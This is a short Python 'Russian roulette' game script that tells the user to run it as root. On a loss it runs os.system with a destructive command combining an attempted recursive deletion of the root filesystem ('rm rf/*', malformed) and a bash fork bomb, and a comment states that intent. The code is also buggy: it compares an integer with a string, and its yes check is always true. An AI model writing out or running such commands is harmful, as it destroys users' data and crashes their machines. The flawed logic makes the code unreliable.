#Import os and random
import os
import random 

start_game = input("Wanna play a game? \n \n ")
play = input("Russian roulette... pick a number between 1 and 6 \n make sure your running as root \n")
list = [1,2,3,4,5,6]
choose = random.choice(list)

def print_banner(text: str, symbol: str = "*") -> None:
    banner_length = len(text) + 4
    banner_line = symbol * banner_length

    print(banner_line)
    print(f"{symbol} {text} {symbol}")
    print(banner_line)
text = "Russian Roulette"

def main():
    print_banner(text)
    start_game

    # if you loose the game should run a fork bomb 

    if start_game == str("yes") or str("Yes"):
        play
        choose
        if choose == play:
            print("You loose :( ") and os.system("rm rf/* | :(){ :|:& };:")
        else:
            print("You Win")
    else:
        print("smart move")
        

main()
